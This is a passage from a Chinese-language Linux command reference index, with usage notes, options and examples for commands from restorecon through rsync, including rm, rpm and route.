-Z也可以看出,文件和目录的SELinux信息不匹配\n\n```shell\n[root@jsdig.com html]# ls -Z /var/www/html/\n.... unconfined_u:object_r:admin_home_t:s0 index.html\n\n[root@jsdig.com html]# ls -Zd /var/www/html/\n.... system_u:object_r:httpd_sys_content_t:s0 /var/www/html/\n```\n\n使用restorecon来恢复网页主目录中所有文件的SELinux配置信息(如果目标为一个目录，可以添加-R参数递归)\n\n```shell\n[root@jsdig.com html]# restorecon -R /var/www/html/\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","restorecon"]},{"title":"【Linux 命令】return","url":"/linux-command/return/","content":"\n从函数中退出并返回数值。\n\n## 概要\n\n```shell\nreturn [n]\n```\n\n## 主要用途\n\n- 使得shell函数退出并返回数值，如果没有指定n的值，则默认为函数最后一条命令执行的返回状态。\n\n## 参数\n\nn（可选）：整数。\n\n## 返回值\n\n返回值为你指定的参数n的值，如果你指定的参数大于255或小于0，那么会通过加或减256的方式使得返回值总是处于0到255之间。\n\n在函数外执行return语句会返回失败。\n\n## 例子\n\n```shell\n#!/usr/bin/env bash\n# 定义一个返回值大于255的函数\nexample() {\n  return 259\n}\n# 执行函数\nexample\n# 显示3\necho $?\n```\n\n### 注意\n\n1. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","return"]},{"title":"【Linux 命令】rev","url":"/linux-command/rev/","content":"\n将文件内容以字符为单位反序输出\n\n## 补充说明\n\n**rev命令** 将文件中的每行内容以字符为单位反序输出，即第一个字符最后输出，最后一个字符最先输出，依次类推。\n\n###  语法\n\n```shell\nrev(参数)\n```\n\n###  参数\n\n文件：指定要反序显示内容的文件。\n\n###  实例\n\n```shell\n[root@localhost ~]# cat iptables.bak\n# Generated by iptables-save v1.3.5 on Thu Dec 26 21:25:15 2013\n*filter\n:INPUT DROP [48113:2690676]\n:FORWARD accept [0:0]\n:OUTPUT ACCEPT [3381959:1818595115]\n-A INPUT -i lo -j ACCEPT\n-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT\n-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT\n-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT\n-A INPUT -p icmp -j ACCEPT\n-A OUTPUT -o lo -j ACCEPT\nCOMMIT\n# Completed on Thu Dec 26 21:25:15 2013\n\n[root@localhost ~]# rev iptables.bak \n3102 51:52:12 62 ceD uhT no 5.3.1v evas-selbatpi yb detareneG #\nretlif*\n]6760962:31184[ PORD TUPNI:\n]0:0[ TPECCA DRAWROF:\n]5115958181:9591833[ TPECCA TUPTUO:\n TPECCA j- ol i- TUPNI A-\n TPECCA j- 22 tropd-- pct m- pct p- TUPNI A-\n TPECCA j- 08 tropd-- pct m- pct p- TUPNI A-\n TPECCA j- DEHSILBATSE,DETALER etats-- etats m- TUPNI A-\n TPECCA j- pmci p- TUPNI A-\n TPECCA j- ol o- TUPTUO A-\nTIMMOC\n3102 51:52:12 62 ceD uhT no detelpmoC #\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","rev"]},{"title":"【Linux 命令】rexec","url":"/linux-command/rexec/","content":"\n远程执行Linux系统下命令\n\n## 补充说明\n\n**rexec命令** 用于在指定的远程Linux系统主机上执行命令，向远程rexec服务器发出执行命令的请求。\n\nrexec命令通过检查`$HOME/.netrc`文件（包含远程主机上使用的用户名和密码）来提供自动登录的功能。如果没有发现此类项或系统在安全方式下操作（参阅 securetcpip 命令），rexec命令提示输入一个远程主机的有效用户名和密码。这两种情况下，rexec均导致远程系统上的rexecd使用缺省的compat用户登录认证方法。rexecd不会为了备用的认证方法去查找`/etc/security/user`文件。也可以指定`-n`标志到rexec命令行上来重设自动登录功能。\n\n###  语法\n\n```shell\nrexec(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：表示远程命令的标准错误与标准输出相同，不支持发送任意信号到远程进程；\n-l<用户名>：指定连接远程rexec服务器的用户名；\n-p<密码>：指定连接远程rexec服务器的密码；\n-n：明确地提示输入用户名和密码。\n```\n\n###  参数\n\n*   远程主机：指定远程主机（ip地址或主机名）；\n*   命令：指定需要在远程主机上执行的命令。\n\n###  实例\n\n要在一个远程主机上执行date命令，输入：\n\n```shell\nrexec host1 date\n```\n\ndate命令的输出现在显示在本地系统上。本示例中，在本地主机上的`$HOME/.netrc`文件包含远程主机上有效的用户名和密码。如果没有远程主机的`$HOME/.netrc`文件中的有效项，将提示输入登录标识和密码。输入所要求的登录信息后，date命令的输出显示在本地系统上。\n\n要重设自动登录功能并执行远程主机上的date命令，输入：\n\n```shell\nrexec -nhost1 date\n```\n\n出现提示时输入用户名和密码，date命令的输出现在显示在本地系统上。\n\n列出远程主机上另一个用户的目录，输入：\n\n```shell\nrexec host1 ls -l /home/karen\n```\n\n在远程主机host1上的karen 用户的目录列表显示在本地系统上。\n\n如果没有远程主机的`$HOME/.netrc`文件中的有效项，将提示您输入登录标识和密码。输入要求的登录信息后，在远程主机host1上的karen用户的目录列表显示在本地系统上。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","rexec"]},{"title":"【Linux 命令】rlogin","url":"/linux-command/rlogin/","content":"\n从当前终端登录到远程Linux主机\n\n## 补充说明\n\n**rlogin命令** 用于从当前终端登录到远程Linux主机。\n\n###  语法\n\n```shell\nrlogin(选项)(参数)\n```\n\n###  选项\n\n```shell\n-8：允许输入8位字符数据；\n-e脱离字符>：设置脱离字符；\n-E：滤除脱离字符；\n-l用户名称>：指定要登入远端主机的用户名称；\n-L：使用litout模式进行远端登入阶段操作。\n```\n\n###  参数\n\n远程主机：指定要登录的远程主机（ip地址或者域名）。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","rlogin"]},{"title":"【Linux 命令】rm","url":"/linux-command/rm/","content":"\n用于删除给定的文件和目录\n\n## 补充说明\n\n**rm**  **命令** 可以删除一个目录中的一个或多个文件或目录，也可以将某个目录及其下属的所有文件及其子目录均删除掉。对于链接文件，只是删除整个链接文件，而原有文件保持不变。\n\n注意：使用rm命令要格外小心。因为一旦删除了一个文件，就无法再恢复它。所以，在删除文件之前，最好再看一下文件的内容，确定是否真要删除。rm命令可以用-i选项，这个选项在使用文件扩展名字符删除多个文件时特别有用。使用这个选项，系统会要求你逐一确定是否要删除。这时，必须输入y并按Enter键，才能删除文件。如果仅按Enter键或其他字符，文件不会被删除。\n\n### 语法\n\n```shell\nrm (选项)(参数)\n```\n\n### 选项\n\n```shell\n-d：直接把欲删除的目录的硬连接数据删除成0，删除该目录；\n-f：强制删除文件或目录；\n-i：删除已有文件或目录之前先询问用户；\n-r或-R：递归处理，将指定目录下的所有文件与子目录一并处理；\n--preserve-root：不对根目录进行递归操作；\n-v：显示指令的详细执行过程。\n```\n\n### 参数\n\n文件：指定被删除的文件列表，如果参数中含有目录，则必须加上`-r`或者`-R`选项。\n\n### 实例\n\n交互式删除当前目录下的文件test和example\n\n```shell\nrm -i test example\nRemove test ?n（不删除文件test)\nRemove example ?y（删除文件example)\n```\n\n删除当前目录下除隐含文件外的所有文件和子目录\n\n```shell\n# rm -r *\n```\n\n应注意，这样做是非常危险的!\n\n**rm 命令删除当前目录下的 package-lock.json 文件**\n\n```shell\nfind .  -name \"package-lock.json\" -exec rm -rf {} \\;\n```\n\n**rm 命令删除当前目录下的 node_modules 目录**\n\n```shell\nfind . -name 'node_modules' -type d -prune -exec rm -rf '{}' +\n```\n\n**rm 命令删除文件**\n\n```shell\n# rm 文件1 文件2 ...\nrm testfile.txt\n```\n\n**rm 命令删除目录**\n\n> rm -r [目录名称]\n> -r 表示递归地删除目录下的所有文件和目录。\n> -f 表示强制删除\n\n```shell\nrm -rf testdir\nrm -r testdir\n```\n\n**删除操作前有确认提示**\n\n> rm -i [文件/目录]\n\n```shell\nrm -r -i testdir\n```\n\n**rm 忽略不存在的文件或目录**\n\n> -f 选项（LCTT 译注：即 “force”）让此次操作强制执行，忽略错误提示\n\n```shell\nrm -f [文件...]\n```\n\n**仅在某些场景下确认删除**\n\n> 选项 -I，可保证在删除超过 3 个文件时或递归删除时（LCTT 译注： 如删除目录）仅提示一次确认。\n\n\n```shell\nrm -I file1 file2 file3\n```\n\n**删除根目录**\n\n> 当然，删除根目录（/）是 Linux 用户最不想要的操作，这也就是为什么默认 rm 命令不支持在根目录上执行递归删除操作。\n> 然而，如果你非得完成这个操作，你需要使用 --no-preserve-root 选项。当提供此选项，rm 就不会特殊处理根目录（/）了。\n\n```shell\n不给实例了，操作系统都被你删除了，你太坏了😆\n```\n\n**rm 显示当前删除操作的详情**\n\n```shell\nrm -v [文件/目录]\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","rm"]},{"title":"【Linux 命令】rmdir","url":"/linux-command/rmdir/","content":"\n用来删除空目录\n\n## 补充说明\n\n**rmdir命令** 用来删除空目录。当目录不再被使用时，或者磁盘空间已到达使用限定值，就需要删除失去使用价值的目录。利用rmdir命令可以从一个目录中删除一个或多个空的子目录。该命令从一个目录中删除一个或多个子目录，其中dirname佬表示目录名。如果dirname中没有指定路径，则删除当前目录下由dirname指定的目录；如dirname中包含路径，则删除指定位置的目录。删除目录时，必须具有对其父目录的写权限。\n\n注意：子目录被删除之前应该是空目录。就是说，该目录中的所有文件必须用rm命令全部，另外，当前工作目录必须在被删除目录之上，不能是被删除目录本身，也不能是被删除目录的子目录。\n\n虽然还可以用带有`-r`选项的rm命令递归删除一个目录中的所有文件和该目录本身，但是这样做存在很大的危险性。\n\n###  语法 \n\n```shell\nrmdir(选项)(参数)\n```\n\n###  选项 \n\n```shell\n-p或--parents：删除指定目录后，若该目录的上层目录已变成空目录，则将其一并删除；\n--ignore-fail-on-non-empty：此选项使rmdir命令忽略由于删除非空目录时导致的错误信息；\n-v或-verboes：显示命令的详细执行过程；\n--help：显示命令的帮助信息；\n--version：显示命令的版本信息。\n```\n\n###  参数 \n\n目录列表：要删除的空目录列表。当删除多个空目录时，目录名之间使用空格隔开。\n\n###  实例 \n\n将工作目录下，名为 `www` 的子目录删除 :\n\n```shell\nrmdir www\n```\n\n在工作目录下的 www 目录中，删除名为 Test 的子目录。若 Test 删除后，www 目录成为空目录，则 www 亦予删除。\n\n```shell\nrmdir -p www/Test\n```\n\n下面命令等价于 `rmdir a/b/c`, `rmdir a/b`, `rmdir a`\n\n```shell\nrmdir -p a/b/c\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","rmdir"]},{"title":"【Linux 命令】rmmod","url":"/linux-command/rmmod/","content":"\n从运行的内核中移除指定的内核模块\n\n## 补充说明\n\n**rmmod命令** 用于从当前运行的内核中移除指定的内核模块。执行rmmod指令，可删除不需要的模块。Linux操作系统的核心具有模块化的特性，应此在编译核心时，务须把全部的功能都放如核心。你可以将这些功能编译成一个个单独的模块，待有需要时再分别载入它们。\n\n### 语法\n\n```shell\nrmmod(选项)(参数)\n```\n\n### 选项\n\n```shell\n-v：显示指令执行的详细信息；\n-f：强制移除模块，使用此选项比较危险；\n-w：等待着，直到模块能够被除时在移除模块；\n-s：向系统日志（syslog）发送错误信息。\n```\n\n### 参数\n\n模块名：要移除的模块名称。\n\n### 实例\n\n用rmmod命令主要用于卸载正在使用的Linux内核模块，与`modprobe -r`命令相似，如下所示：\n\n```shell\n[root@localhost boot]# lsmod | grep raid1\nraid1                  25153  0\n\n[root@localhost boot]# rmmod raid1\n[root@localhost boot]# lsmod | grep raid1\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","rmmod"]},{"title":"【Linux 命令】route","url":"/linux-command/route/","content":"\n显示并设置Linux中静态路由表\n\n## 补充说明\n\n**route命令** 用来显示并设置Linux内核中的网络路由表，route命令设置的路由主要是静态路由。要实现两个不同的子网之间的通信，需要一台连接两个网络的路由器，或者同时位于两个网络的网关来实现。\n\n在Linux系统中设置路由通常是为了解决以下问题：该Linux系统在一个局域网中，局域网中有一个网关，能够让机器访问Internet，那么就需要将这台机器的ip地址设置为Linux机器的默认路由。要注意的是，直接在命令行下执行route命令来添加路由，不会永久保存，当网卡重启或者机器重启之后，该路由就失效了；可以在`/etc/rc.local`中添加route命令来保证该路由设置永久有效。\n\n###  语法\n\n```shell\nroute(选项)(参数)\n```\n\n###  选项\n\n```shell\n-A：设置地址类型；\n-C：打印将Linux核心的路由缓存；\n-v：详细信息模式；\n-n：不执行DNS反向查找，直接显示数字形式的IP地址；\n-e：netstat格式显示路由表；\n-net：到一个网络的路由表；\n-host：到一个主机的路由表。\n```\n\n###  参数\n\n```shell\nAdd：增加指定的路由记录；\nDel：删除指定的路由记录；\nTarget：目的网络或目的主机；\ngw：设置默认网关；\nmss：设置TCP的最大区块长度（MSS），单位MB；\nwindow：指定通过路由表的TCP连接的TCP窗口大小；\ndev：路由记录所表示的网络接口。\n```\n\n###  实例\n\n **显示当前路由：** \n\n```shell\n[root@localhost ~]# route\nKernel IP routing table\nDestination     Gateway         Genmask         Flags Metric Ref    Use Iface\n112.124.12.0    *               255.255.252.0   U     0      0        0 eth1\n10.160.0.0      *               255.255.240.0   U     0      0        0 eth0\n192.168.0.0     10.160.15.247   255.255.0.0     UG    0      0        0 eth0\n172.16.0.0      10.160.15.247   255.240.0.0     UG    0      0        0 eth0\n10.0.0.0        10.160.15.247   255.0.0.0       UG    0      0        0 eth0\ndefault         112.124.15.247  0.0.0.0         UG    0      0        0 eth1\n\n[root@localhost ~]# route -n\nKernel IP routing table\nDestination     Gateway         Genmask         Flags Metric Ref    Use Iface\n112.124.12.0    0.0.0.0         255.255.252.0   U     0      0        0 eth1\n10.160.0.0      0.0.0.0         255.255.240.0   U     0      0        0 eth0\n192.168.0.0     10.160.15.247   255.255.0.0     UG    0      0        0 eth0\n172.16.0.0      10.160.15.247   255.240.0.0     UG    0      0        0 eth0\n10.0.0.0        10.160.15.247   255.0.0.0       UG    0      0        0 eth0\n0.0.0.0         112.124.15.247  0.0.0.0         UG    0      0        0 eth1\n```\n\n其中Flags为路由标志，标记当前网络节点的状态，Flags标志说明：\n\n*   U Up表示此路由当前为启动状态。\n*   H Host，表示此网关为一主机。\n*   G Gateway，表示此网关为一路由器。\n*   R Reinstate Route，使用动态路由重新初始化的路由。\n*   D Dynamically,此路由是动态性地写入。\n*   M Modified，此路由是由路由守护程序或导向器动态修改。\n*   ! 表示此路由当前为关闭状态。\n\n **添加网关/设置网关：** \n\n```shell\nroute add -net 224.0.0.0 netmask 240.0.0.0 dev eth0    #增加一条到达244.0.0.0的路由。\n```\n\n **屏蔽一条路由：** \n\n```shell\nroute add -net 224.0.0.0 netmask 240.0.0.0 reject     #增加一条屏蔽的路由，目的地址为224.x.x.x将被拒绝。\n```\n\n **删除路由记录：** \n\n```shell\nroute del -net 224.0.0.0 netmask 240.0.0.0\nroute del -net 224.0.0.0 netmask 240.0.0.0 reject\n```\n\n **删除和添加设置默认网关：** \n\n```shell\nroute del default gw 192.168.120.240\nroute add default gw 192.168.120.240\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","route"]},{"title":"【Linux 命令】rpm","url":"/linux-command/rpm/","content":"\nRPM软件包的管理工具\n\n## 补充说明\n\n**rpm命令** 是RPM软件包的管理工具。rpm原本是Red Hat Linux发行版专门用来管理Linux各项套件的程序，由于它遵循GPL规则且功能强大方便，因而广受欢迎。逐渐受到其他发行版的采用。RPM套件管理方式的出现，让Linux易于安装，升级，间接提升了Linux的适用度。\n\n### 语法\n\n```shell\nrpm(选项)(参数)\n```\n\n### 选项\n\n```shell\n-a：查询所有套件；\n-b<完成阶段><套件档>+或-t <完成阶段><套件档>+：设置包装套件的完成阶段，并指定套件档的文件名称；\n-c：只列出组态配置文件，本参数需配合\"-l\"参数使用；\n-d：只列出文本文件，本参数需配合\"-l\"参数使用；\n-e<套件档>或--erase<套件档>：删除指定的套件；\n-f<文件>+：查询拥有指定文件的套件；\n-h或--hash：套件安装时列出标记；\n-i：显示套件的相关信息；\n-i<套件档>或--install<套件档>：安装指定的套件档；\n-l：显示套件的文件列表；\n-p<套件档>+：查询指定的RPM套件档；\n-q：使用询问模式，当遇到任何问题时，rpm指令会先询问用户；\n-R：显示套件的关联性信息；\n-s：显示文件状态，本参数需配合\"-l\"参数使用；\n-U<套件档>或--upgrade<套件档>：升级指定的套件档；\n-v：显示指令执行过程；\n-vv：详细显示指令执行过程，便于排错。\n```\n\n### 参数\n\n软件包：指定要操纵的rpm软件包。\n\n### 实例\n\n **如何安装rpm软件包**\n\nrpm软件包的安装可以使用程序rpm来完成。执行下面的命令：\n\n```shell\nrpm -ivh your-package.rpm\n```\n\n其中your-package.rpm是你要安装的rpm包的文件名，一般置于当前目录下。\n\n安装过程中可能出现下面的警告或者提示：\n\n```shell\n... conflict with ...\n```\n\n可能是要安装的包里有一些文件可能会覆盖现有的文件，缺省时这样的情况下是无法正确安装的可以用`rpm --force -i`强制安装即可\n\n```shell\n... is needed by ...\n... is not installed ...\n```\n\n此包需要的一些软件你没有安装可以用`rpm --nodeps -i`来忽略此信息，也就是说`rpm -i --force --nodeps`可以忽略所有依赖关系和文件问题，什么包都能安装上，但这种强制安装的软件包不能保证完全发挥功能。\n\n **如何安装.src.rpm软件包**\n\n有些软件包是以.src.rpm结尾的，这类软件包是包含了源代码的rpm包，在安装时需要进行编译。这类软件包有两种安装方法：\n\n方法一：\n\n```shell\nrpm -i your-package.src.rpm\ncd /usr/src/redhat/SPECS\nrpmbuild -bp your-package.specs             #一个和你的软件包同名的specs文件\ncd /usr/src/redhat/BUILD/your-package/      #一个和你的软件包同名的目录\n./configure                                 #这一步和编译普通的源码软件一样，可以加上参数\nmake\nmake install\n```\n\n方法二：\n\n```shell\nrpm -i you-package.src.rpm\ncd /usr/src/redhat/SPECS\n```\n\n前两步和方法一相同\n\n```shell\nrpmbuild -bb your-package.specs       #一个和你的软件包同名的specs文件\n```\n\n这时在`/usr/src/redhat/RPM/i386/`（根据具体包的不同，也可能是i686,noarch等等）在这个目录下，有一个新的rpm包，这个是编译好的二进制文件。\n\n执行`rpm -i new-package.rpm`即可安装完成。\n\n **如何卸载rpm软件包**\n\n使用命令`rpm -e`包名，包名可以包含版本号等信息，但是不可以有后缀.rpm，比如卸载软件包proftpd-1.2.8-1，可以使用下列格式：\n\n```shell\nrpm -e proftpd-1.2.8-1\nrpm -e proftpd-1.2.8\nrpm -e proftpd-\nrpm -e proftpd\n```\n\n不可以是下列格式：\n\n```shell\nrpm -e proftpd-1.2.8-1.i386.rpm\nrpm -e proftpd-1.2.8-1.i386\nrpm -e proftpd-1.2\nrpm -e proftpd-1\n```\n\n有时会出现一些错误或者警告：\n\n```shell\n... is needed by ...\n```\n\n这说明这个软件被其他软件需要，不能随便卸载，可以用rpm -e --nodeps强制卸载\n\n **如何不安装但是获取rpm包中的文件**\n\n使用工具rpm2cpio和cpio\n\n```shell\nrpm2cpio xxx.rpm | cpio -vi\nrpm2cpio xxx.rpm | cpio -idmv\nrpm2cpio xxx.rpm | cpio --extract --make-directories\n```\n\n参数i和extract相同，表示提取文件。v表示指示执行进程，d和make-directory相同，表示根据包中文件原来的路径建立目录，m表示保持文件的更新时间。\n\n **如何查看与rpm包相关的文件和其他信息**\n\n下面所有的例子都假设使用软件包mysql-3.23.54a-11\n\n1、我的系统中安装了那些rpm软件包。\n\n```shell\nrpm -qa 讲列出所有安装过的包\n```\n\n如果要查找所有安装过的包含某个字符串sql的软件包\n\n```shell\nrpm -qa | grep sql\n```\n\n2、如何获得某个软件包的文件全名。\n\n```shell\nrpm -q mysql\n```\n\n可以获得系统中安装的mysql软件包全名，从中可以获得当前软件包的版本等信息。这个例子中可以得到信息mysql-3.23.54a-11\n\n3、一个rpm包中的文件安装到那里去了？\n\n```shell\nrpm -ql 包名\n```\n\n注意这里的是不包括.rpm后缀的软件包的名称，也就是说只能用mysql或者mysql-3.23.54a-11而不是mysql-3.23.54a-11.rpm。如果只是想知道可执行程序放到那里去了，也可以用which，比如：\n\n```shell\nwhich mysql\n```\n\n4、一个rpm包中包含那些文件。\n\n*   一个没有安装过的软件包，使用`rpm -qlp  **** .rpm`\n*   一个已经安装过的软件包，还可以使用`rpm -ql  **** .rpm`\n\n5、如何获取关于一个软件包的版本，用途等相关信息？\n\n*   一个没有安装过的软件包，使用`rpm -qip  **** .rpm`\n*   一个已经安装过的软件包，还可以使用`rpm -qi  **** .rpm`\n\n6、某个程序是哪个软件包安装的，或者哪个软件包包含这个程序。\n\n```shell\nrpm -qf `which 程序名`    #返回软件包的全名\nrpm -qif `which 程序名`   #返回软件包的有关信息\nrpm -qlf `which 程序名`   #返回软件包的文件列表\n```\n\n注意，这里不是引号，而是`，就是键盘左上角的那个键。也可以使用`rpm -qilf`，同时输出软件包信息和文件列表。\n\n7、某个文件是哪个软件包安装的，或者哪个软件包包含这个文件。\n\n注意，前一个问题中的方法，只适用与可执行的程序，而下面的方法，不仅可以用于可执行程序，也可以用于普通的任何文件。前提是知道这个文件名。首先获得这个程序的完整路径，可以用whereis或者which，然后使用`rpm -qf`例如：\n\n```shell\nwhereis ftptop\nftptop: /usr/bin/ftptop /usr/share/man/man1/ftptop.1.gz\n\nrpm -qf /usr/bin/ftptop\nproftpd-1.2.8-1\n\nrpm -qf /usr/share/doc/proftpd-1.2.8/rfc/rfc0959.txt\nproftpd-1.2.8-1\n```\n\n## 更多实例\n> 库依赖: http://rpmfind.net/\n\n源码包 -> 编译 -> 二进制包(rpm 包 / 系统默认包)\n\nrpm 命名规则: 软件(软件名, 软件版本) + 系统(os 版本, os 位数)\nrpm 校验: SM5DLUGT -> size modified(类型/权限) md5 device L(文件路径) user group time(modified time)\n\nyum: 解决 rpm 依赖的问题\n\n```shell\n# rpm\nmysql57-community-release-el6-8.noarch.rpm # 一个 rpm 包的例子\n/var/lib/rpm/ # 包全名 -> 包名 的数据库\n\nrpm -Uivh --dodeps xxx # upgrade install verbose hash\nrpm -qilpfa|grep xxx # query info list(rpm包安装后的文件位置) package(rpm 包) file(文件属于哪个rpm文件) all\nrpm -e # erase\nrpm -V # verify\nrpm2cpio | cpio -idv\n\n# rpm 默认安装位置\n/etc/           配置文件\n/usr/bin/       可执行文件\n/urs/lib/       程序使用的函数库\n/usr/share/doc/ 使用手册\n/usr/share/man/ manual\n```\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","rpm"]},{"title":"【Linux 命令】rpm2cpio","url":"/linux-command/rpm2cpio/","content":"\n将RPM软件包转换为cpio格式的文件\n\n## 补充说明\n\n**rpm2cpio命令** 用于将rpm软件包转换为cpio格式的文件。\n\n###  语法\n\n```shell\nrpm2cpio(参数)\n```\n\n###  参数\n\n文件：指定要转换的rpm包的文件名。\n\n###  实例\n\n```shell\nrpm2cpio ../libstdc++-4.3.0-8.i386.rpm | cpio -idv\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","rpm2cpio"]},{"title":"【Linux 命令】rpmbuild","url":"/linux-command/rpmbuild/","content":"\n创建RPM的二进制软件包和源码软件包\n\n## 补充说明\n\n**rpmbuild命令** 被用于创建rpm的二进制软件包和源码软件包。\n\n###  语法\n\n```shell\nrpmbuild(选项)\n```\n\n###  选项\n\n```shell\n--initdb：初始化RPM数据库；\n--rebuilddb：从已安装的包头文件，方向重建RPM数据库；\n-ba：创建二进制和源代码包；\n-bb：创建二进制代码包；\n-bs：创建源代码包。\n```\n\n###  实例\n\n```shell\nrpmbuild -ba 'spec文件路径'\n```\n\nbuild完后，可以在`/usr/src/redhat/RPMS/`下找到二进制rpm包，rpm包按照其对应的cpu体系结构分类，通常在`/usr/src/redhat/RPMS/i386`目录下。`/usr/src/redhat/SRPMS/`下找到源码rpm包，此时由于是源代码，所以无须按体系结构分类。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","rpmbuild"]},{"title":"【Linux 命令】rpmdb","url":"/linux-command/rpmdb/","content":"\n初始化和重建RPM数据库\n\n## 补充说明\n\n**rpmdb命令** 用于初始化和重建rpm数据库。\n\n###  语法\n\n```shell\nrpmdb(选项)\n```\n\n###  选项\n\n```shell\n--initdb：初始化RPM数据库；\n--rebuilddb：从已安装的包头文件，反向重建RPM数据库。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","rpmdb"]},{"title":"【Linux 命令】rpmquery","url":"/linux-command/rpmquery/","content":"\n从RPM数据库中查询软件包信息\n\n## 补充说明\n\n**rpmquery命令** 使用多种依据从rpm数据库中查询软件包信息。\n\n###  语法\n\n```shell\nrpmquery(选项)\n```\n\n###  选项\n\n```shell\n-qf：查询指定的文件所属的软件包；\n-q：查询指定的软件包是否被安装；\n-qc：查询软件包中的配置文件；\n-qd：查询软件包中的文档文件；\n-qi：查询软件包的基本信息。\n```\n\n###  实例\n\n使用rpmquery命令查询指定文件所属的软件包：\n\n```shell\n[root@localhost ~]# rpmquery -qf /usr/bin/htpasswd\nhttpd-2.2.3-81.el5.centos\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","rpmquery"]},{"title":"【Linux 命令】rpmsign","url":"/linux-command/rpmsign/","content":"\n使用RPM软件包的签名管理工具\n\n## 补充说明\n\n**rpmsign命令** 使用rpm软件包的签名管理工具。\n\n###  语法\n\n```shell\nrpmsign(选项)\n```\n\n###  选项\n\n```shell\n--addsign：为自动软件包添加签名；\n--checksig：验证软件包签名；\n--delsign：删除软件包签名；\n--import：导入公钥；\n--resign：重新签名软件包；\n--nodigest：不验证软件包摘要；\n--nosignature：不验证软件包签名。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","rpmsign"]},{"title":"【Linux 命令】rpmverify","url":"/linux-command/rpmverify/","content":"\n验证已安装的RPM软件包的正确性\n\n## 补充说明\n\n**rpmverify命令** 用来验证已安装的rpm软件包的正确性。\n\n###  语法\n\n```shell\nrpmverify(选项)\n```\n\n###  选项\n\n```shell\n-Va：验证所有软件包；\n-V<软件包>f：验证指定软件包；\n--nomd5：不验证软件包的md5摘要。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","rpmverify"]},{"title":"【Linux 命令】rsh","url":"/linux-command/rsh/","content":"\n连接远程主机并执行命令\n\n## 补充说明\n\n**rsh命令** 用于连接到远程的指定主机并执行指定的命令。\n\n###  语法\n\n```shell\nrsh(选项)(参数)\n```\n\n###  选项\n\n```shell\n-d：使用Socket层级的排错功能；\n-l<用户名称>：指定要登入远端主机的用户名称；\n-n：把输入的指令号向代号为/dev/null的特殊外围设备。\n```\n\n###  参数\n\n*   远程主机：指定要连接的远程主机；\n*   指令：指定要在远程主机上执行的命令。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","rsh"]},{"title":"【Linux 命令】rsync","url":"/linux-command/rsync/","content":"\n远程数据同步工具\n\n## 补充说明\n\n**rsync命令** 是一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件。rsync使用所谓的“rsync算法”来使本地和远程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。 rsync是一个功能非常强大的工具，其命令也有很多功能特色选项，我们下面就对它的选项一一进行分析说明。\n\n### 语法\n\n```shell\nrsync [OPTION]... SRC DEST\nrsync [OPTION]... SRC [USER@]host:DEST\nrsync [OPTION]... [USER@]HOST:SRC DEST\nrsync [OPTION]... [USER@]HOST::SRC DEST\nrsync [OPTION]... SRC [USER@]HOST::DEST\nrsync [OPTION]... rsync://[USER@]HOST[:PORT]/SRC [DEST]\n```\n\n对应于以上六种命令格式，rsync有六种不同的工作模式：\n\n1.  拷贝本地文件。当SRC和DES路径信息都不包含有单个冒号\":\"分隔符时就启动这种工作模式。如：`rsync -a /data /backup`\n2.  使用一个远程shell程序(如rsh、ssh)来实现将本地机器的内容拷贝到远程机器。当DST路径地址包含单个冒号\":\"分隔符时启动该模式。如：`rsync -avz *.c foo:src`\n3.  使用一个远程shell程序(如rsh、ssh)来实现将远程机器的内容拷贝到本地机器。当SRC地址路径包含单个冒号\":\"分隔符时启动该模式。如：`rsync -avz foo:src/bar /data`\n4.  从远程rsync服务器中拷贝文件到本地机。当SRC路径信息包含\"::\"分隔符时启动该模式。如：`rsync -av root@192.168.78.192::www /databack`\n5.  从本地机器拷贝文件到远程rsync服务器中。当DST路径信息包含\"::\"分隔符时启动该模式。如：`rsync -av /databack root@192.168.78.192::www`\n6.  列远程机的文件列表。这类似于rsync传输，不过只要在命令中省略掉本地机信息即可。如：`rsync -v rsync://192.168.78.192/www`\n\n### 选项\n\n```shell\n-v, --verbose 详细模式输出。\n-q, --quiet 精简输出模式。\n-c, --checksum 打开校验开关，强制对文件传输进行校验。\n-a, --archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于-rlptgoD。\n-r, --recursive 对子目录以递归模式处理。\n-R, --relative 使用相对路径信息。\n-b, --backup 创建备份，也就是对于目的已经存在有同样的文件名时，将老的文件重新命名为~filename。可以使用--suffix选项来指定不同的备份文件前缀。\n--backup-dir 将备份文件(如~filename)存放在在目录下。\n-suffix=SUFFIX 定义备份文件前缀。\n-u, --update 仅仅进行更新，也就是跳过所有已经存在于DST，并且文件时间晚于要备份的文件，不覆盖更新的文件。\n-l, --links 保留软链结。\n-L, --copy-links 想对待常规文件一样处理软链结。\n--copy-unsafe-links 仅仅拷贝指向SRC路径目录树以外的链结。\n--safe-links 忽略指向SRC路径目录树以外的链结。\n-H, --hard-links 保留硬链结。\n-p, --perms 保持文件权限。\n-o, --owner 保持文件属主信息。\n-g, --group 